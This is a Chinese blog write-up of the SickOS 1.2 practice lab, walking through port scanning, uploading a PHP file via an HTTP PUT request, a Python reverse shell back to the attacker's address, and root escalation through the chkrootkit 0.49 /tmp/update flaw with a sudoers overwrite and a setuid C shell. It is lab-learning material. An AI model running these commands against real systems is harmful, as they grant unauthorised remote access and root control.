@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta name="description" content="本网站是个人兴趣爱好，总结分享经验，记录生活点滴的平台，希望在以后的学习旅途中，走出自己的风景。" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>Sickos-1.2 |  n0rt6&#39;s blog</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.jpg" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--点击爱心-->
+<script type="text/javascript" src="\js\clickLove.js"></script>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Sickos-1-2"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Sickos-1.2
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/03/18/Sickos-1-2/" class="article-date">
+  <time datetime="2024-03-18T13:18:18.000Z" itemprop="datePublished">2024-03-18</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.8k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">8 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <meta name="referrer" content="no-referrer"/>
+
+<h2 id="发现主机"><a href="#发现主机" class="headerlink" title="发现主机"></a>发现主机</h2><blockquote>
+<p>nmap 192.168.206.138&#x2F;24</p>
+</blockquote>
+<p>发现主机192.168.206.157</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><blockquote>
+<p>nmap 192.168.206.157 -p- -A -sS</p>
+</blockquote>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.157
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0011s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65533</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
+PORT   STATE SERVICE VERSION
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">5</span>.9p1 Debian 5ubuntu1.8 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey: 
+<span class="token operator">|</span>   <span class="token number">1024</span> <span class="token number">66</span>:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 <span class="token punctuation">(</span>DSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   <span class="token number">2048</span> ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  <span class="token number">256</span> a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http    lighttpd <span class="token number">1.4</span>.28
+<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
+<span class="token operator">|</span>_http-server-header: lighttpd/1.4.28
+MAC Address: 00:0C:29:0B:25:C7 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
+Device type: general purpose
+Running: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux <span class="token number">3.10</span> - <span class="token number">4.11</span>, Linux <span class="token number">3.16</span> - <span class="token number">4.6</span>, Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>, Linux <span class="token number">4.4</span>
+Network Distance: <span class="token number">1</span> hop
+Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="token number">1</span>   <span class="token number">1.09</span> ms <span class="token number">192.168</span>.206.157
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">117.00</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>从上面可以看到使用了web服务器lighttpd&#x2F;1.4.28，开放了22和80端口，尝试搜索lighttpd&#x2F;1.4.28是否存在漏洞<br><img src="https://img-blog.csdnimg.cn/direct/4fb3bdb0befc46b1a6eb89cf31b44619.png" alt="132"><br>尝试mod_userdir Information Disclosure发现也不可以</p>
+<p>扫描期间先看看http服务，查看源代码没有任何发现，扫一下目录</p>
+<blockquote>
+<p>dirsearch -u <a target="_blank" rel="noopener" href="http://192.168.206.157/">http://192.168.206.157/</a></p>
+</blockquote>
+<p>扫描结果：<br><img src="https://img-blog.csdnimg.cn/direct/e04aee37b3064b23ada3bf552163d9b7.png" alt="lighttpd/1.4.28"><br>发现存在一个目录test，访问看看目录下无文件<br><img src="https://img-blog.csdnimg.cn/direct/620462a816814f1ab3b0e1bfe8f185f3.png" alt="123"></p>
+<p>既然无文件那么能够上传文件吗</p>
+<h2 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h2><p>这是重要的一步，自己做的时候没有往这方面想。<br>那么该如何知道是否可以上传文件呢？<br>查看&#x2F;test目录支持的方法</p>
+<blockquote>
+<p><code>nmap --script http-methods --script-args http-methods.url-path=&#39;/test&#39; 192.168.206.157</code><br><img src="https://img-blog.csdnimg.cn/direct/a494d6fdf7a54f3390350e5e975b771e.png" alt="123"></p>
+</blockquote>
+<p>burp抓包发送OPTIONS请求：<br><img src="https://img-blog.csdnimg.cn/direct/3bbc61a3d87c49b698b35495dc301085.png" alt="123"></p>
+<p>curl发送OPTIONS请求：</p>
+<blockquote>
+<p><code>curl  -v -X OPTIONS http://192.168.206.157/test/</code><br><img src="https://img-blog.csdnimg.cn/direct/68d04e5de38346b6a0d9a96d6723bcb5.png" alt="123"></p>
+</blockquote>
+<p>以上方法都可以查看接受的请求方法。接受PUT方法就是我们可以以PUT方法写入文件。尝试一下：</p>
+<blockquote>
+<p><code>curl -v -X PUT -d &quot;&lt;?php phpinfo();?&gt;&quot; http://192.168.206.157/test/shell.php</code></p>
+</blockquote>
+<p>发现已经成功写入文件，那么开始写入一句话木马，或者直接传入php反弹shell的文件。<br><img src="https://img-blog.csdnimg.cn/direct/2f5bbf15aa8749ba9633546cf7d45bb3.png" alt="132"></p>
+<p>使用蚁剑连接靶机，目前权限为www-data。收集信息进行提权。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>上传linux信息收集脚本：<br>运行收集信息时文件不好看，尝试先反弹那一个shell，再进行信息收集。再创建一个反弹shell文件，尝试了几个脚本发现都不行，最后找到这个脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os
+s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.206.138"</span><span class="token punctuation">,</span><span class="token number">443</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
+p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>kali监听端口，蚁剑上运行命令<code>python python.py</code>，得到一个伪终端。<br><img src="https://img-blog.csdnimg.cn/direct/6164c2511cf0498c81a4cdc22e487081.png" alt="123"><br>执行文件linpeas.sh，似乎没有发现什么</p>
+<h2 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h2><p>这又是重要一步，想不到哇。。。<br>列出与定时任务相关的文件和目录</p>
+<blockquote>
+<p>www-data@ubuntu:&#x2F;var&#x2F;www&#x2F;test$ ls -al &#x2F;etc&#x2F;cron*<br><img src="https://img-blog.csdnimg.cn/direct/e415f1d44e6b464c98277d27cc5e1785.png" alt="123"></p>
+</blockquote>
+<h3 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h3><p>chkrootkit version 0.49存在本地提权漏洞<br><img src="https://img-blog.csdnimg.cn/direct/3b36f2fb4224479984a15cb5ba363c6b.png" alt="123"></p>
+<blockquote>
+<p>漏洞原理:chkrootkit有crontab，会定期以root身份执行&#x2F;tmp&#x2F;update文件。如果攻击者知道管理员是定期运行chkrootkit(通过查看cron.daily获知)，并且对&#x2F; tmp(没有挂载noexec)有写访问权限，就可以利用该漏洞获取root权限。</p>
+</blockquote>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">We just found a serious vulnerability in the chkrootkit package, which
+may allow local attackers to gain root access to a box in certain
+configurations (/tmp not mounted noexec).
+
+The vulnerability is located in the function slapper() in the
+shellscript chkrootkit:
+
+#
+# SLAPPER.&#123;A,B,C,D&#125; and the multi-platform variant
+#
+slapper ()&#123;
+   SLAPPER_FILES="$&#123;ROOTDIR&#125;tmp/.bugtraq $&#123;ROOTDIR&#125;tmp/.bugtraq.c"
+   SLAPPER_FILES="$SLAPPER_FILES $&#123;ROOTDIR&#125;tmp/.unlock $&#123;ROOTDIR&#125;tmp/httpd \
+   $&#123;ROOTDIR&#125;tmp/update $&#123;ROOTDIR&#125;tmp/.cinik $&#123;ROOTDIR&#125;tmp/.b"a
+   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "
+   OPT=-an
+   STATUS=0
+   file_port=
+
+   if $&#123;netstat&#125; "$&#123;OPT&#125;"|$&#123;egrep&#125; "^tcp"|$&#123;egrep&#125; "$&#123;SLAPPER_PORT&#125;">
+/dev/null 2>&amp;1
+      then
+      STATUS=1
+      [ "$SYSTEM" = "Linux" ] &amp;&amp; file_port=`netstat -p $&#123;OPT&#125; | \
+         $egrep ^tcp|$egrep "$&#123;SLAPPER_PORT&#125;" | $&#123;awk&#125; '&#123; print  $7 &#125;' |
+tr -d :`
+   fi
+   for i in $&#123;SLAPPER_FILES&#125;; do
+      if [ -f $&#123;i&#125; ]; then
+         file_port=$file_port $i
+         STATUS=1
+      fi
+   done
+   if [ $&#123;STATUS&#125; -eq 1 ] ;then
+      echo "Warning: Possible Slapper Worm installed ($file_port)"
+   else
+      if [ "$&#123;QUIET&#125;" != "t" ]; then echo "not infected"; fi
+         return $&#123;NOT_INFECTED&#125;
+   fi
+&#125;
+
+
+The line 'file_port=$file_port $i' will execute all files specified in
+$SLAPPER_FILES as the user chkrootkit is running (usually root), if
+$file_port is empty, because of missing quotation marks around the
+variable assignment.
+
+Steps to reproduce:
+
+- Put an executable file named 'update' with non-root owner in /tmp (not
+mounted noexec, obviously)
+- Run chkrootkit (as uid 0)
+
+Result: The file /tmp/update will be executed as root, thus effectively
+rooting your box, if malicious content is placed inside the file.
+
+If an attacker knows you are periodically running chkrootkit (like in
+cron.daily) and has write access to /tmp (not mounted noexec), he may
+easily take advantage of this.
+
+
+Suggested fix: Put quotation marks around the assignment.
+
+file_port="$file_port $i"
+
+
+I will also try to contact upstream, although the latest version of
+chkrootkit dates back to 2009 - will have to see, if I reach a dev there.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>复制步骤:<br>-在&#x2F;tmp目录下放置一个名为’update’的可执行文件，其所有者不是root<br>挂载noexec，显然)<br>—运行chkrootkit(以uid 0为例)<br>结果:文件&#x2F;tmp&#x2F;update将以root身份执行，因此有效<br>如果恶意内容被放置在文件中，就会在您的盒子中生根。<br>如果攻击者知道您定期运行chkrootkit(如在<br>并且对&#x2F;tmp有写访问权限(没有挂载noexec)，他可以<br>很容易利用这一点。<br>建议修复:在赋值处加上引号。<br>file_port &#x3D; “ file_port我美元”<br>我也会尽量联系上游，虽然最新的版本<br>chkrootkit可以追溯到2009年-如果我在那里找到一个开发人员，我会看到。</p>
+</blockquote>
+<p>在&#x2F;tmp目录下创建文件update，并且赋予权限<br><code>www-data@ubuntu:/tmp$ touch update;chmod +x update</code><br>写入将www-date添加到sudo组的命令</p>
+<blockquote>
+<p><code>echo &#39;chmod +w /etc/sudoers &amp;&amp; echo &quot;www-data ALL=(ALL)  NOPASSWD:ALL&quot; &gt; /etc/sudoers&#39; &gt; /tmp/update</code></p>
+</blockquote>
+<p>喝杯茶的时间再输入命令<code>sudo -l</code><br><img src="https://img-blog.csdnimg.cn/direct/df4a079c1eec4c7da1e42c017053bf4c.png" alt="132"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/770472af6bb24b639fac9be292d09cd2.png" alt="123"><br>查看一下文件newRule</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Generated by iptables-save v1.4.12 on Mon Apr 25 22:48:24 2016</span>
+*filter
+:INPUT DROP <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
+:FORWARD ACCEPT <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
+:OUTPUT DROP <span class="token punctuation">[</span><span class="token number">0</span>:0<span class="token punctuation">]</span>
+<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> ACCEPT
+<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">80</span> <span class="token parameter variable">-j</span> ACCEPT
+<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">8080</span> <span class="token parameter variable">-j</span> ACCEPT
+<span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">443</span> <span class="token parameter variable">-j</span> ACCEPT
+<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> ACCEPT
+<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--sport</span> <span class="token number">80</span> <span class="token parameter variable">-j</span> ACCEPT
+<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">8080</span> <span class="token parameter variable">-j</span> ACCEPT
+<span class="token parameter variable">-A</span> OUTPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">-m</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">443</span> <span class="token parameter variable">-j</span> ACCEPT
+COMMIT
+<span class="token comment"># Completed on Mon Apr 25 22:48:24 2016</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>终于知道问什么反弹shell的时候不能使用6666端口了，原来是限定端口了。。。</p>
+<p>还有一个提权的脚本</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//shell.c</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
+<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chown root:root /tmp/update"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod 4755 /tmp/update"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<blockquote>
+<p>gcc shell.c -o &#x2F;tmp&#x2F;update</p>
+</blockquote>
+<p>之后运行update文件</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总体来说靶机有点意思，重要的几点就是PUT方式上传木马，反弹shell的时候端口的限用，使用chkrootkit的版本漏洞进行提权</p>
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://3143047748.github.io/2024/03/18/Sickos-1-2/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2024/03/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web2/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">应急响应靶机训练-Web2</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.staticfile.org/valine/1.4.16/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "5s6sYhVyYIhL1fb7zrErH8BX-gzGzoHsz",
+    app_key: "829xTABHQSNKYRHRILDlEluh",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022-2024
+        <i class="ri-heart-fill heart_icon"></i> n0rt6
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="https://beian.miit.gov.cn/" target="_black" rel="nofollow">豫ICP备88888888</a>
+        </li>
+        
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.png" alt="n0rt6&#39;s blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">Index</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">Archives</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">Categories</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">Tags</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">Friends</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">About Me</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
